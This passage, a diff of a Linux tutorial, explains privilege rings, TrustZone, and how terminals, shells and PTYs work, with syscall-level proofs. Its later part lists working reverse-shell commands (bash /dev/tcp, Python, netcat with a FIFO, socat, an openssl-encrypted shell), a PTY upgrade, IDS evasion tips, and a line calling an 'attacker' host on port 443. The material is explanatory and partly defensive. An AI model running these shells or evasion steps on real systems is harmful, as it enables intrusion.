+TrustZone adds an orthogonal (perpendicular) security dimension to the exception level system. Every memory access, every register, every peripheral has an additional property: **Secure** or **Non-Secure**.
+
+```
+x86 privilege model (one axis):
+
+Ring 3 ──────────────────────────────────────► Ring 0
+User programs                                Kernel
+Less privilege                           More privilege
+
+ARM privilege model (two axes):
+
+                    Normal World         Secure World
+                    (NS bit = 1)         (NS bit = 0)
+                    ────────────         ────────────
+EL0 (user):         Android apps         TEE user apps
+EL1 (kernel):       Linux kernel         OP-TEE OS
+EL2 (hypervisor):   KVM hypervisor       (rare)
+EL3 (monitor):      ──── Secure Monitor controls both worlds ────
+
+The Secure Monitor at EL3 is the most privileged code on the system.
+A fully compromised Linux kernel (EL1 Normal World) cannot read
+Secure World memory — the hardware enforces the NS bit on every access.
+```
+
+This is why TrustZone protects fingerprint templates, payment credentials and cryptographic keys even when Android is completely compromised. The hardware refuses to hand Normal World code access to Secure World memory, regardless of privilege level in the Normal World.
+
+---
+
+## How Rings Relate to Every Security Vulnerability
+
+Every privilege escalation attack is an attempt to cross a ring boundary without using the legitimate gate:
+
+```
+Ring 3 -> Ring 0 (privilege escalation):
+  Exploit kernel vulnerability from user program
+  Gain code execution in ring 0
+  Disable security policies, install rootkit, read all memory
+
+  Example: kernel buffer overflow
+    Ring 3 sends malicious input to kernel subsystem
+    Buffer overflow corrupts kernel stack return address
+    Kernel returns to attacker shellcode in ring 0
+    Full kernel privilege obtained
+
+Ring 0 -> VMX root (hypervisor escape):
+  Exploit hypervisor vulnerability from guest kernel
+  Gain code execution in hypervisor
+  Control all guest VMs on the physical host
+
+EL1 Normal -> Secure World (TrustZone escape):
+  Exploit Secure World Trusted Application from Normal World
+  Gain code execution inside TrustZone
+  Read all cryptographic keys, biometric templates
+  Bypass all hardware security guarantees
+  Highest value target in mobile security
+
+The syscall gate itself (ring 3 -> ring 0):
+  Every system call is a controlled crossing
+  Kernel must validate ALL arguments before using them
+  Using unvalidated user pointers in kernel = TOCTOU race
+  Returning sensitive kernel data to ring 3 = information leak
+```
+
+---
+
+## The Complete Ring Picture — From 1964 to Today
+
+```
+1964  Multics / GE-645
+  Eight hardware rings designed and implemented
+  Most ambitious privilege model ever conceived
+
+1969  Unix created (Bell Labs)
+  Deliberately simplified Multics
+  Uses only two levels: kernel and user
+  System calls as the gate — INT 0x80 on early x86
+
+1982  Intel 80286
+  First x86 CPU with hardware ring enforcement
+  Protected mode with all four rings working
+
+1985  Intel 80386
+  Rings work in 32-bit protected mode
+  Unix, OS/2, Windows NT all use rings 0 and 3 only
+
+1991  Linux kernel
+  Ring 0 = kernel
+  Ring 3 = all user processes
+  System calls via INT 0x80
+
+2003  AMD64 / x86-64
+  Rings preserved in 64-bit mode
+  SYSCALL replaces INT 0x80 (faster gate mechanism)
+
+2005  Intel VT-x / AMD-V
+  VMX root mode added — more privileged than ring 0
+  Hypervisors run in VMX root
+  Guest OS runs in VMX non-root with its own ring 0
+
+2011  Intel Sandy Bridge adds SMEP
+2012  Intel Broadwell adds SMAP
+  Hardware defences close exploitation techniques
+  that used ring boundary for shellcode and data attacks
+
+2015  ARM ARMv8-A
+  Exception Levels replace simple kernel/user split
+  EL0-EL3 plus TrustZone Secure/Non-Secure worlds
+
+Today on your Pop!_OS machine (x86-64):
+  VMX root mode  <- KVM hypervisor (if running VMs)
+  Ring 0         <- Linux kernel
+  Ring 3         <- bash, your applications, everything else
+
+Today on a modern Android phone (ARM64):
+  EL3 Secure Monitor
+  EL1/EL0 Secure World  <- TrustZone (fingerprint, keys, payments)
+  EL2                   <- pKVM hypervisor
+  EL1 Normal World      <- Linux kernel
+  EL0 Normal World      <- all Android apps
+```
+
+---
+
+## Verification — Seeing Rings on Your Machine
+
+```bash
+# Ring 0 privilege required — fails from ring 3 without sudo
+sudo rdmsr 0x1B          # read CPU model-specific register (ring 0 only)
+
+# The SYSCALL gate address — where ring 3 enters ring 0
+sudo rdmsr 0xC0000082    # LSTAR register = address of syscall entry point
+
+# Every strace line is a complete ring 3->ring 0->ring 3 transition
+strace ls 2>&1 | head -10
+
+# Count all ring transitions a program makes
+strace -c ls
+
+# CPU features related to rings
+grep -m1 "flags" /proc/cpuinfo | tr ' ' '\n' | grep -E "smep|smap|vmx|svm"
+# vmx = Intel VT-x (VMX root mode support)
+# svm = AMD-V (AMD virtualisation)
+# smep = supervisor mode execution prevention
+# smap = supervisor mode access prevention
+
+# See kernel using SMAP (stac/clac instructions around user memory access)
+sudo grep -c "stac\|clac" /proc/kallsyms 2>/dev/null || echo "check objdump"
+
+# Android — see TrustZone interface
+# adb shell ls /dev/tee*
+# adb shell ls /dev/qseecom
+```
+-e 
+---
+
+# Chapter 04: History and Philosophy — The ASR-33, Unix, C, BSD and Linux
 
 Before a single line of kernel code, before partitions and filesystems, before any of the technical machinery — there was a philosophy. That philosophy was shaped by a mechanical typewriter from 1963, two engineers in a Bell Labs office in 1969, a university research group in Berkeley, and a Finnish student in 1991. Understanding where Linux comes from explains why it works the way it does. Every design decision you will encounter in the rest of this document traces back to this chapter.
 
@@ -2764,6 +3688,938 @@ The terminal is the window and the wire. The shell is one possible program that 
 
 ---
 
+## Exhaustive Proof — Terminal, Shell, Prompt and Reverse Shells
+
+Every claim in this section is proved with a runnable command and an explanation of exactly what the kernel and bash are doing at the system call level.
+
+---
+
+### Part 1 — Proving a Shell Does Not Need a Terminal
+
+#### The strace Proof
+
+`strace` shows every system call a process makes. You can verify that bash's behaviour is identical regardless of whether stdin is a terminal, a file, or a pipe.
+
+```bash
+# Case 1: bash with a terminal attached — see the read() calls
+strace -e trace=read,write,ioctl bash 2>&1 | head -30
+# You will see ioctl() calls on fd 0 — bash checking terminal properties
+# You will see read(0, ...) blocking for your input
+
+# Case 2: bash with a pipe — same read() but no ioctl()
+echo 'ls' | strace -e trace=read,write,ioctl bash 2>&1 | head -30
+# No ioctl() calls — bash does not bother checking terminal properties
+# Still sees read(0, ...) but from the pipe
+
+# The difference: ioctl(0, TCGETS, ...) is the isatty() implementation
+# isatty() internally calls ioctl(fd, TCGETS, &termios)
+# If it succeeds -> fd is a terminal
+# If it fails with ENOTTY -> fd is not a terminal
+strace -e trace=ioctl bash -c 'ls' 2>&1 | grep TCGETS
+# Shows the isatty() check happening and failing (ENOTTY)
+```
+
+#### The /proc Proof — Seeing File Descriptor Types
+
+```bash
+# Start bash normally and check its file descriptors
+echo $$   # get bash PID
+ls -la /proc/$$/fd
+# Shows:
+# lrwxrwxrwx 1 leokadia leokadia 64 ... 0 -> /dev/pts/3
+# lrwxrwxrwx 1 leokadia leokadia 64 ... 1 -> /dev/pts/3
+# lrwxrwxrwx 1 leokadia leokadia 64 ... 2 -> /dev/pts/3
+# All three point to the PTY slave device
+
+# Now check bash running from a file
+bash /tmp/test.sh &
+BGPID=$!
+ls -la /proc/$BGPID/fd
+# Shows:
+# 0 -> /tmp/test.sh  (a regular file)
+# 1 -> /dev/pts/3    (inherited stdout from your terminal)
+# 2 -> /dev/pts/3    (inherited stderr)
+
+# Bash reading from a file — stdin is a file, not a terminal
+# bash never prints a prompt because isatty(0) returns false
+```
+
+#### The lsof Proof
+
+`lsof` (list open files) shows what each file descriptor is connected to with its type:
+
+```bash
+# Your current bash session
+lsof -p $$ | grep -E "^bash.*(0[uw]|1[uw]|2[uw])"
+# Shows type CHR (character device) for PTY — that is your terminal
+# Specific device: /dev/pts/N
+
+# Bash receiving input from a pipe
+sleep 100 | bash -c 'lsof -p $$ | head' &
+# Shows type PIPE for fd 0 — definitely not a terminal
+
+# Bash with redirected stdout
+bash -c 'lsof -p $$ | head' > /tmp/out.txt
+cat /tmp/out.txt
+# fd 1 shows type REG (regular file) pointing to /tmp/out.txt
+```
+
+#### Every Input Source Proven
+
+```bash
+# 1. Regular file as stdin
+cat > /tmp/cmds.sh << 'EOF'
+echo "I am running from a file"
+pwd
+whoami
+EOF
+bash /tmp/cmds.sh
+# Works. No prompt. Commands execute silently.
+
+# 2. Pipe as stdin
+printf 'echo "from a pipe"\npwd\nwhoami\n' | bash
+# Works. No prompt. Commands execute silently.
+
+# 3. Here string as stdin
+bash <<< 'echo "from a here string"'
+# Works. No prompt.
+
+# 4. Here document as stdin
+bash << 'EOF'
+echo "from a here document"
+ls /tmp | head -3
+EOF
+# Works. No prompt.
+
+# 5. Process substitution
+bash <(echo 'echo "from process substitution"')
+# Works. No prompt.
+
+# 6. /dev/stdin explicitly
+echo 'echo "from dev stdin"' | bash /dev/stdin
+# Works. No prompt.
+
+# 7. Named pipe (FIFO) as stdin
+mkfifo /tmp/myfifo
+bash < /tmp/myfifo &
+BASHPID=$!
+echo 'echo "from named pipe"' > /tmp/myfifo
+wait $BASHPID
+rm /tmp/myfifo
+# Works. No prompt.
+
+# In all 7 cases: bash read commands from fd 0, executed them,
+# wrote output to fd 1. No terminal was involved or needed.
+```
+
+---
+
+### Part 2 — Proving a Terminal Does Not Need a Shell
+
+#### What the Terminal Emulator Actually Does
+
+```bash
+# See what GNOME Terminal executes when you open it
+strace -f -e trace=execve gnome-terminal 2>&1 | grep execve
+# You will see execve("/bin/bash", ...) or whatever your login shell is
+# The terminal called execve() with bash — a configuration choice
+
+# Change what gnome-terminal runs without changing anything else
+gnome-terminal -- python3
+# Opens terminal window, runs python3
+# You get >>> prompt from Python
+# No bash, no shell prompt, fully interactive
+
+gnome-terminal -- /usr/bin/top
+# Opens terminal window, runs top directly
+# No shell
+
+gnome-terminal -- /usr/bin/htop
+# Opens terminal window, runs htop directly
+# No shell
+
+gnome-terminal -- cat
+# Opens terminal window, runs cat
+# You type, it echoes
+# No shell, no prompt from bash
+```
+
+#### Proving the PTY Exists Regardless of What Runs Inside
+
+```bash
+# Even when running python3, a PTY is created
+gnome-terminal -- python3 &
+sleep 1
+# Find the python3 process and check its file descriptors
+PYPID=$(pgrep -n python3)
+ls -la /proc/$PYPID/fd | head -5
+# fd 0, 1, 2 all point to /dev/pts/N — the PTY slave
+# The terminal created the PTY and connected python3 to it
+# Python3 calls isatty(0) -> true -> enters interactive mode -> shows >>>
+
+# The terminal emulator holds the PTY master fd
+# python3 holds the PTY slave fd
+# The line discipline sits between them
+# This is identical to what happens with bash
+# The only difference is what program sits on the slave end
+```
+
+#### xterm Examples With Proof
+
+```bash
+# Terminal running a network tool — no shell
+xterm -e "nc -lvnp 9999" &
+# xterm created a PTY, ran netcat on the slave
+# Netcat is listening for connections
+# No shell
+
+# Terminal running ssh directly — shell is on the remote machine
+xterm -e "ssh user@remotehost" &
+# xterm creates PTY locally
+# SSH reads from PTY, encrypts, sends over network
+# Remote sshd creates another PTY on the remote side
+# Remote bash sits on the remote PTY slave
+# Two PTYs: one local (xterm-ssh), one remote (sshd-bash)
+# Two line disciplines
+# The local terminal has no shell at all
+
+# Terminal running a custom program
+cat > /tmp/my_repl.py << 'EOF'
+import sys
+print("My custom REPL — no shell")
+while True:
+    try:
+        line = input("myrepl> ")
+        print(f"You typed: {line}")
+    except EOFError:
+        break
+EOF
+xterm -e "python3 /tmp/my_repl.py"
+# Custom prompt "myrepl> " from our Python code
+# No bash involved anywhere
+```
+
+---
+
+### Part 3 — Proving the Prompt Is Just Printed Text
+
+#### PS1 Is Evaluated, Not Just Printed
+
+PS1 is not a static string — it is evaluated each time the prompt is displayed. This means it can contain dynamic content:
+
+```bash
+# PS1 can contain command substitutions (evaluated each prompt)
+PS1='$(date +%H:%M:%S) $ '
+# Every time you press Enter a new prompt shows the current time
+# bash calls: write(1, "10:23:45 $ ", 11) before each read()
+
+# PS1 can show the current git branch
+PS1='$(git branch 2>/dev/null | grep "^*" | sed "s/* //") $ '
+# Every prompt evaluates the git command
+# Changes as you cd between repositories
+
+# PS1 can show exit code of last command
+PS1='[$(echo $?)] $ '
+# Shows [0] after success, [1] after failure
+
+# All of this is text that bash generates and writes to stdout
+# None of it is special — it is bytes written to fd 1
+```
+
+#### Proving PS1 Is Just a write() Call
+
+```bash
+# strace bash and see exactly when and how PS1 is printed
+strace -e trace=write bash 2>&1 | grep -A1 "write(1"
+# You will see write(1, "user@host:~$ ", 13) = 13
+# Before every read(0, ...) call
+# That write() IS the prompt — nothing more
+
+# Prove it is optional
+PS1="" bash
+# No write() calls for prompts
+# Shell still runs every command correctly
+# strace would show read(0,...) with no preceding write(1,...)
+
+# Prove any text works
+PS1="ANYTHING_HERE > " bash
+# strace shows write(1, "ANYTHING_HERE > ", 16)
+# The terminal displays that text
+# That is the entire mechanism of prompts
+```
+
+#### Interactive vs Non-Interactive vs Login Shell
+
+These are three distinct concepts that are frequently confused:
+
+```bash
+# Interactive shell: reads commands from a terminal (isatty(0)=true)
+# or was started with -i flag
+bash -i                    # forced interactive even if stdin is not TTY
+bash                       # interactive if stdin is TTY
+
+# Non-interactive shell: reads from file, pipe, etc.
+bash script.sh             # non-interactive
+echo 'ls' | bash           # non-interactive
+bash -c 'ls'               # non-interactive
+
+# Login shell: first shell when you log in (reads /etc/profile, ~/.bash_profile)
+bash -l                    # login shell
+bash --login               # same
+# Indicated by: echo $0 shows "-bash" (leading dash) in a real login shell
+
+# The four combinations:
+bash -i                    # interactive non-login
+bash -l                    # non-interactive login (unusual)
+bash -il                   # interactive login (normal login session)
+bash script.sh             # non-interactive non-login (script)
+
+# What each reads at startup:
+# Login:        /etc/profile, ~/.bash_profile (or ~/.bash_login, ~/.profile)
+# Interactive:  ~/.bashrc
+# Both:         both sets of files
+# Neither:      nothing (fastest startup)
+```
+
+#### SIGHUP — What Happens When the Terminal Closes
+
+When a terminal emulator window is closed, the kernel sends SIGHUP (Signal Hangup — named after the modem hangup signal from the teletype era) to the foreground process group of that terminal's session:
+
+```bash
+# Demonstrate SIGHUP
+bash -c 'trap "echo SIGHUP received >> /tmp/sighup_test" SIGHUP; sleep 30' &
+BGPID=$!
+# Now close the terminal or kill the PTY
+# The sleeping process receives SIGHUP and writes to the file
+
+# nohup prevents SIGHUP from killing your process
+nohup long_running_command &
+# nohup redirects stdin to /dev/null, stdout/stderr to nohup.out
+# Installs a SIGHUP ignore handler
+# Process continues after terminal closes
+
+# Prove nohup with strace
+strace nohup bash -c 'sleep 10' 2>&1 | grep -E "signal|SIGHUP|open"
+# Shows: open("nohup.out", ...) - creating the output file
+# Shows: sigaction(SIGHUP, {SIG_IGN}) - ignoring SIGHUP
+```
+
+---
+
+### Part 4 — The isatty() Mechanism in Full Detail
+
+#### What isatty() Actually Does in the Kernel
+
+```bash
+# isatty() is implemented as a single ioctl() call
+# Verify this by looking at glibc source or using strace
+
+strace bash -c '' 2>&1 | grep -i "ioctl.*TCGETS\|isatty"
+# You will see: ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0
+# Return value 0 means success -> fd 0 IS a terminal
+# Return value -1 with errno=ENOTTY means NOT a terminal
+
+# When stdin is a pipe:
+echo '' | strace bash -c '' 2>&1 | grep "TCGETS"
+# ioctl(0, TCGETS, 0x...) = -1 ENOTTY (Inappropriate ioctl for device)
+# bash sees ENOTTY -> isatty() returns 0 -> not interactive
+
+# You can call isatty() yourself in Python
+python3 -c "
+import os, sys
+print('stdin is TTY:', os.isatty(0))
+print('stdout is TTY:', os.isatty(1))
+" | cat
+# stdin is TTY: False  (piped into cat)
+# stdout is TTY: False (piped from python)
+
+python3 -c "
+import os
+print('stdin is TTY:', os.isatty(0))
+print('stdout is TTY:', os.isatty(1))
+"
+# stdin is TTY: True   (connected to PTY)
+# stdout is TTY: True  (connected to PTY)
+```
+
+#### The tty Command — Showing Your Current Terminal
+
+```bash
+# Show which PTY device your shell is connected to
+tty
+# Output: /dev/pts/3 (or whatever PTY was allocated)
+
+# In a non-interactive context:
+echo 'tty' | bash
+# Output: not a tty
+# bash's stdin is the pipe, not a PTY
+
+# Each terminal window gets its own PTY
+# Open three terminal windows and run tty in each:
+# Window 1: /dev/pts/0
+# Window 2: /dev/pts/1
+# Window 3: /dev/pts/2
+# Each is a separate PTY pair in the kernel
+
+# See all active PTY slaves
+ls -la /dev/pts/
+# crw--w---- 1 leokadia tty 136, 0 ... pts/0
+# crw--w---- 1 leokadia tty 136, 1 ... pts/1
+# crw--w---- 1 leokadia tty 136, 2 ... pts/2
+# c = character device
+# major 136 = PTY slave device
+```
+
+#### stty — Terminal Settings Inherited by Shells
+
+`stty` shows and modifies the line discipline settings. These settings are properties of the PTY, not of bash:
+
+```bash
+# See all current terminal settings
+stty -a
+# Output shows:
+# speed 38400 baud; rows 40; columns 180;
+# intr = ^C; quit = ^\; erase = ^?; kill = ^U;
+# start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
+# ...flags: -parenb -parodd ... icanon isig echo echoe echok...
+
+# Key settings explained:
+# icanon = canonical (cooked) mode — buffer lines until Enter
+# isig   = interpret signal chars (Ctrl-C sends SIGINT)
+# echo   = echo input characters back to screen
+# intr=^C = Ctrl-C is the interrupt character
+
+# These settings live in the PTY slave's line discipline
+# They are inherited when bash forks a child process
+# A child process has the same PTY slave fd -> same settings
+
+# Prove inheritance:
+stty -a | grep "intr"
+# intr = ^C
+
+bash -c 'stty -a | grep "intr"'
+# intr = ^C   <- child bash inherited the same settings
+
+# Reverse shells break because:
+# The TCP socket has NO stty settings
+# No line discipline -> no canonical mode -> no signal chars
+# Ctrl-C sends bytes "^C" instead of raising SIGINT
+```
+
+---
+
+### Part 5 — screen and tmux — Programs That Create Their Own PTYs
+
+`screen` and `tmux` are multiplexers. They sit between your terminal emulator and your shell, creating their own PTY pairs. Understanding this explains why they survive terminal closure and why you can attach from a different terminal.
+
+```bash
+# When you run tmux:
+# 1. tmux server starts (if not already running) — a daemon
+# 2. tmux client connects to server via Unix domain socket
+# 3. tmux server creates a NEW PTY pair for the shell
+# 4. tmux server forks bash and connects it to the new PTY slave
+# 5. tmux client renders the bash output in your terminal
+
+# The PTY hierarchy:
+# Your terminal emulator -> PTY pair A -> tmux client
+# tmux server -> PTY pair B -> bash
+
+# PTY pair A: between terminal emulator and tmux client
+# PTY pair B: between tmux server and bash
+
+# When you close the terminal emulator:
+# PTY pair A is destroyed
+# tmux client disconnects from server
+# PTY pair B still exists (server is still running)
+# bash is still running, connected to PTY pair B
+# You can reattach: tmux attach
+# New PTY pair A is created between new terminal and tmux client
+
+# Prove two PTY layers exist:
+tmux
+tty       # shows /dev/pts/N (tmux's PTY for bash)
+# In another terminal:
+ls /proc/$(pgrep tmux | head -1)/fd | head
+# tmux server holds MULTIPLE PTY master fds — one per window/pane
+```
+
+---
+
+### Part 6 — Reverse Shells — Complete Exhaustive Coverage
+
+#### Every Reverse Shell Method With System Call Analysis
+
+**Method 1 — bash /dev/tcp:**
+
+```bash
+# On attacker machine (Terminal A)
+nc -lvnp 4444
+
+# On target machine (Terminal B)
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+
+# System calls made by bash (prove with strace on target):
+strace bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/tmp/strace_out.txt &
+cat /tmp/strace_out.txt | grep -E "socket|connect|dup2|execve"
+# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+# connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr="127.0.0.1"}, 16) = 0
+# dup2(3, 1)  = 1    <- stdout = socket
+# dup2(3, 2)  = 2    <- stderr = socket
+# dup2(1, 0)  = 0    <- stdin = same socket (via 0>&1)
+# No open() for /dev/tcp — bash handles this internally
+```
+
+**Method 2 — bash /dev/udp (less common, useful when TCP is blocked):**
+
+```bash
+# UDP reverse shell — no connection state, harder to detect
+# Attacker:
+nc -u -lvnp 4444
+
+# Target:
+bash -i >& /dev/udp/127.0.0.1/4444 0>&1
+# Same mechanism as /dev/tcp but uses SOCK_DGRAM instead of SOCK_STREAM
+# UDP has no connection — packets may arrive out of order
+# Useful when TCP egress filtering is in place but UDP is allowed
+```
+
+**Method 3 — Python with full socket control:**
+
+```bash
+python3 -c "
+import socket, subprocess, os, pty
+
+# Create TCP socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 4444))
+
+# Wire socket to stdin/stdout/stderr using dup2
+os.dup2(s.fileno(), 0)   # stdin
+os.dup2(s.fileno(), 1)   # stdout
+os.dup2(s.fileno(), 2)   # stderr
+
+# Execute bash — replaces this Python process
+os.execve('/bin/bash', ['/bin/bash', '-i'], os.environ)
+"
+# This is more explicit than the bash /dev/tcp trick
+# Shows exactly what dup2() and execve() do
+```
+
+**Method 4 — Python with PTY (proper interactive shell):**
+
+```bash
+python3 -c "
+import socket, os, pty
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 4444))
+
+# os.openpty() creates a new PTY pair
+# master_fd = PTY master (we read/write this)
+# slave_fd  = PTY slave (bash gets this as its terminal)
+master_fd, slave_fd = os.openpty()
+
+# Fork bash with PTY slave as its controlling terminal
+pid = os.fork()
+if pid == 0:
+    # Child: this becomes bash
+    os.setsid()              # new session
+    os.dup2(slave_fd, 0)     # bash stdin = PTY slave
+    os.dup2(slave_fd, 1)     # bash stdout = PTY slave
+    os.dup2(slave_fd, 2)     # bash stderr = PTY slave
+    os.close(master_fd)
+    os.execve('/bin/bash', ['/bin/bash'], os.environ)
+else:
+    # Parent: ferry data between socket and PTY master
+    import select
+    while True:
+        r, _, _ = select.select([s, master_fd], [], [])
+        if s in r:
+            data = s.recv(1024)
+            os.write(master_fd, data)
+        if master_fd in r:
+            data = os.read(master_fd, 1024)
+            s.send(data)
+"
+# This reverse shell HAS a PTY
+# Ctrl-C, arrow keys, tab completion all work
+# No upgrade procedure needed
+```
+
+**Method 5 — netcat with -e (when available):**
+
+```bash
+# Traditional netcat (BSD version):
+nc -e /bin/bash 127.0.0.1 4444
+# -e flag: execute program after connection
+# nc connects, then exec()s /bin/bash with socket as stdin/stdout
+
+# Many modern systems ship ncat (nmap's netcat) or openbsd-netcat
+# which removed -e for security reasons
+# Check which you have:
+nc --help 2>&1 | grep -i "\-e\|execute"
+```
+
+**Method 6 — netcat without -e using named pipe:**
+
+```bash
+# When nc has no -e flag, use a named pipe (FIFO)
+mkfifo /tmp/f
+
+# The pipeline:
+# cat reads from /tmp/f (blocks until data arrives)
+# cat's output goes to bash's stdin
+# bash's stdout goes to nc
+# nc sends output to attacker
+# attacker types command -> nc receives -> writes to /tmp/f
+# cat reads from /tmp/f -> sends to bash stdin -> bash executes
+
+cat /tmp/f | /bin/bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f
+
+# Proving the data flow with lsof:
+# /tmp/f is a FIFO (named pipe)
+# cat: 0=FIFO(/tmp/f), 1=pipe
+# bash: 0=pipe(from cat), 1=pipe(to nc), 2=pipe(to nc)
+# nc: 0=socket, 1=FIFO(/tmp/f)
+# Data forms a loop through the pipe and socket
+rm /tmp/f   # cleanup
+```
+
+**Method 7 — socat (most powerful, creates proper PTY):**
+
+```bash
+# Install socat if needed: sudo apt install socat
+
+# Attacker listener (creates PTY on listener side):
+socat file:$(tty),raw,echo=0 tcp-listen:4444
+
+# Target reverse shell with PTY:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444
+
+# socat options explained:
+# exec:'bash -li'  = run bash interactive login
+# pty              = allocate a PTY for bash
+# stderr           = redirect stderr too
+# setsid           = new session (proper controlling terminal)
+# sigint           = pass SIGINT through properly
+# sane             = set sane terminal settings
+
+# Result: fully functional interactive shell
+# No upgrade procedure needed
+# Ctrl-C, arrow keys, tab completion, job control all work
+# This is the best reverse shell for CTFs and pentesting
+```
+
+**Method 8 — Encrypted reverse shell using openssl:**
+
+```bash
+# Why encryption matters:
+# Plain reverse shells send all commands in cleartext over the network
+# IDS/WAF can read and detect the commands
+# Network capture shows everything
+
+# Setup: generate self-signed certificate
+openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem \
+  -out /tmp/cert.pem -days 365 -nodes -subj "/CN=test"
+
+# Attacker listener (encrypts the connection):
+openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem \
+  -port 4444
+
+# Target reverse shell (connects with TLS):
+mkfifo /tmp/s
+/bin/bash -i < /tmp/s 2>&1 | \
+  openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/s
+rm /tmp/s
+
+# All data now travels encrypted over TLS
+# Signature-based IDS cannot read the commands
+# Cannot be detected by content inspection
+# Only flow analysis (connection patterns) can detect it
+```
+
+---
+
+### Part 7 — Why Certain Programs Break in a Dumb Shell
+
+When a program runs in a reverse shell without a PTY, specific checks fail:
+
+#### sudo
+
+```bash
+# sudo requires a TTY for password entry (by default)
+# sudo calls isatty() on stdin — if false, it may refuse
+
+# In a dumb reverse shell:
+sudo ls
+# sudo: a terminal is required to read the password
+
+# Why: sudo uses getpass() which requires a TTY
+# getpass() opens /dev/tty directly (not stdin)
+# /dev/tty is the process's controlling terminal
+# In a dumb shell there is no controlling terminal
+# open("/dev/tty") fails with ENXIO (no such device or address)
+
+# The requiretty setting in /etc/sudoers:
+# Defaults requiretty   <- forces TTY requirement
+# Defaults !requiretty  <- allows sudo without TTY
+
+# Workaround in dumb shell (if NOPASSWD configured):
+sudo -n ls    # -n = non-interactive, never prompt
+```
+
+#### vim
+
+```bash
+# vim needs a proper terminal for cursor movement
+# In a dumb shell:
+vim /tmp/test.txt
+# vim reads terminal capabilities from TERM variable
+# vim sends escape sequences expecting cursor to move
+# Without proper PTY, escape sequences print as garbage
+# The terminal dimensions (rows/cols) are unknown
+
+# vim checks:
+# 1. isatty(0) — needs TTY for input
+# 2. TERM environment variable — needs to know terminal type
+# 3. ioctl(0, TIOCGWINSZ) — needs terminal window size
+
+# Workaround after PTY upgrade:
+export TERM=xterm-256color
+stty rows 40 cols 180
+vim /tmp/test.txt   # now works properly
+```
+
+#### less, more, man
+
+```bash
+# Pagers need a TTY to control display
+# In a dumb shell:
+ls -la | less
+# less: /dev/tty: No such device or address
+
+# less opens /dev/tty directly to read keypresses
+# separate from stdin (which has the piped data)
+# No controlling terminal = no /dev/tty = less fails
+
+# Workaround:
+cat /etc/passwd   # just use cat, no pager
+ls -la | cat      # pipe through cat to disable pager
+```
+
+#### ssh (from within a reverse shell)
+
+```bash
+# ssh needs a PTY to display passwords and handle keys
+# In a dumb reverse shell trying to ssh to another host:
+ssh user@anotherhost
+# May fail or behave strangely without TTY
+# Password prompts go to /dev/tty which does not exist
+
+# Workaround: key-based authentication + BatchMode
+ssh -o BatchMode=yes -o StrictHostKeyChecking=no user@anotherhost
+```
+
+---
+
+### Part 8 — The Full PTY Upgrade Sequence Explained at Syscall Level
+
+When you get a dumb reverse shell and want to upgrade it to a proper PTY shell:
+
+```bash
+# Step 1 — Inside the dumb reverse shell:
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+# What python pty.spawn() does internally:
+# 1. Calls os.openpty() -> creates PTY pair (master_fd, slave_fd)
+# 2. Calls os.fork()
+# 3. Child process:
+#      os.setsid()           <- new session, child is leader
+#      ioctl(slave_fd, TIOCSCTTY, 0)  <- set slave as controlling terminal
+#      dup2(slave_fd, 0)     <- bash stdin = PTY slave
+#      dup2(slave_fd, 1)     <- bash stdout = PTY slave
+#      dup2(slave_fd, 2)     <- bash stderr = PTY slave
+#      os.execve('/bin/bash', ...)    <- become bash
+# 4. Parent process:
+#      ferries data between original stdin/stdout and master_fd
+#      When you type -> parent reads from original stdin
+#                    -> writes to master_fd
+#                    -> line discipline processes it
+#                    -> bash reads from slave
+#      When bash outputs -> parent reads from master_fd
+#                        -> writes to original stdout
+
+# Now bash has a proper controlling terminal (the PTY slave)
+# But your netcat listener is still raw TCP
+# Arrow keys send ESC sequences that the remote PTY handles
+# but your local terminal also tries to handle them
+
+# Step 2 — Back on attacker's netcat listener:
+# Press Ctrl-Z to background netcat
+^Z
+
+# Step 3 — Set local terminal to raw mode
+stty raw -echo
+
+# What stty raw -echo does:
+# raw: disables all line discipline processing on YOUR terminal
+#      every keypress is sent immediately without buffering
+#      Ctrl-C, Ctrl-Z go directly to netcat (and through to remote bash)
+# -echo: stops YOUR terminal from echoing what you type
+#        (the remote bash will echo it through the PTY instead)
+
+# Step 4 — Bring netcat back to foreground
+fg
+
+# Now:
+# Your keystrokes -> your terminal (raw mode, no processing)
+#               -> netcat (immediately)
+#               -> TCP socket
+#               -> remote bash's PTY master
+#               -> remote PTY line discipline (processes Ctrl-C etc)
+#               -> remote bash reads from PTY slave
+# This is exactly like a proper SSH session
+
+# Step 5 — Fix terminal dimensions on remote side
+stty rows $(tput lines) cols $(tput cols)
+export TERM=xterm-256color
+
+# Why dimensions matter:
+# vim, less, htop all call ioctl(0, TIOCGWINSZ) to get terminal size
+# If the PTY was created with 0x0 dimensions, they render incorrectly
+# Setting rows and cols tells the PTY what dimensions to report
+```
+
+---
+
+### Part 9 — IDS Detection and Evasion of Reverse Shells
+
+Understanding how reverse shells are detected informs both defence and penetration testing:
+
+#### How IDS Detects Reverse Shells
+
+```
+Signature-based detection (Snort/Suricata):
+  Pattern: /bin/bash, /bin/sh in network payload
+  Pattern: "bash -i" in cleartext TCP stream
+  Pattern: known reverse shell command strings
+
+  Snort rule example:
+  alert tcp any any -> any any (
+    msg:"Possible Reverse Shell";
+    content:"/bin/bash"; nocase;
+    content:"-i"; distance:1; within:5;
+    sid:9000001;
+  )
+
+Flow-based detection:
+  Outbound TCP connection to unusual port (not 80/443/22)
+  Long-lived TCP connection with low volume bidirectional traffic
+  Connection from server process (web server connecting out)
+  Beaconing pattern (periodic connections at fixed intervals)
+
+Behaviour-based detection:
+  Web server process spawning a shell (nginx -> bash)
+  Process with network connection and shell in process tree
+  Environment variables typical of shells appearing in network processes
+```
+
+#### Evasion Techniques
+
+```bash
+# 1. Use common ports that are allowed outbound
+bash -i >& /dev/tcp/attacker/443 0>&1    # HTTPS port
